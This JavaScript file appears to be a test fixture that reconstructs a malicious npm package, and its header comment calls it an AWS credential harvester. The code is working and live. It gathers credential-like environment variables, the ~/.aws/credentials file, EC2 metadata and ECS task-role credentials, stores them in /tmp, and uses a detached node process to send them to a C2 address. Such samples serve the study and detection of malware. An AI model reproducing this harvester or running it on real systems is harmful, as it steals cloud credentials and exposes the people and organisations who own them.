// Reconstruction of backoff-table@99.9.1 / hedwig-tsconfig@99.8.1
// (author mohammednuredin, 2026-05-12). Multi-source AWS credential
// harvester. Pattern condensed to keep the fixture minimal; the original
// reads IMDS, env, ~/.aws files, ECS task role endpoint, K8s SA token,
// then persists to /tmp and exfils via HTTP POST.
const { execSync, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');
const http = require('http');

const C2 = '203.0.113.77';
const PERSIST = '/tmp/.aws-harvest';

const harvest = {};

// Env source
for (const k of Object.keys(process.env)) {
  if (/AWS|AKIA|SECRET|TOKEN/i.test(k)) harvest[k] = process.env[k];
}

// Filesystem source
try { harvest.creds = fs.readFileSync(path.join(os.homedir(), '.aws', 'credentials'), 'utf8'); } catch (e) {}

// IMDSv1 source (EC2 metadata service)
http.get({ host: '169.254.169.254', path: '/latest/meta-data/iam/security-credentials/' }, (res) => {
  let role = '';
  res.on('data', (c) => { role += c; });
  res.on('end', () => {
    harvest.imds_role = role;
    try { fs.writeFileSync(PERSIST, JSON.stringify(harvest)); } catch (e) {}
    // Exfil via spawn detached (survives parent exit)
    spawn('node', ['-e', 'require("http").request({host:"' + C2 + '",path:"/aws"},()=>{}).end(' + JSON.stringify(JSON.stringify(harvest)) + ')'], { detached: true, stdio: 'ignore' }).unref();
  });
}).on('error', () => {});

// Inline exec source — ECS task role
try { execSync('curl -s 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'); } catch (e) {}
